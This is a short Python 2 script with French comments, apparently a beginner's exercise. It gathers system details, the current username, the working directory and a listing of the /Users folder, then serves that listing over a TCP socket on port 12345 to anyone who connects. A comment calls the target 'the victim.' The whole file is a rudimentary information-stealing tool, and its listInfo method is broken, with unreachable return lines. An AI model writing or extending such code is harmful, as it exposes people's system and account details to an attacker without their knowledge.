import socket
import subprocess
import os,sys
#==========================================================================================

#creation d'une classe pour rendre le programme oriente objet
class GetInfo:
    infos = os.uname()
    currentUser = os.getlogin()
    rep_actuel = os.getcwd()
    myDirectory = os.listdir("/Users/")
    scanpath = "Liste de tous les repertoires dans Users : \n"

    def listInfo(self):
        #afficher des informations sur le systeme
        return GetInfo.infos
        #afficher l'utilisateur actuel
        return GetInfo.currentUser
        #afficher le path du repertoire actuel
        return GetInfo.rep_actuel

    def scan(self):
        #print "Liste de tous les repertoires dans Users/"
        #on liste toutes les directories et sous directories
        for file in GetInfo.myDirectory:
            GetInfo.scanpath += file + "; \n"
        return GetInfo.scanpath

#instance de l objet GetInfo (creation de l'objet)
GetMyInfo = GetInfo()
# afficage des infos de l'objet
#GetMyInfo.listInfo()
#GetMyInfo.scan()
#==========================================================================================
# on cree un objet socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print "Socket successfully created"

# reservation d'un port specifique
port = 12345

# contient le nom d hote et le numero du port
#identifiant le serveur auquel on veut se connecter.
s.bind(('127.0.0.1', port))
print "socket binded to %s" %(port)

# activation du mode ecoute
# avec un nombre maximum de connexions qu il peut recevoir sur ce port sans les accepter
s.listen(5)
print "socket is listening"


GetMyInfo.scan()

#==========================================================================================

# gestion des erreurs
while True:
   # on etabli la connection avec le client
   client, addr = s.accept()
   print 'Got connection from', addr

   #client.send("Liste de tous les repertoires dans Users/")
   # send the informations about the victim.
   client.send(GetMyInfo.scan())

   print client.recvfrom(2048)

# on ferme la connection
s.close()
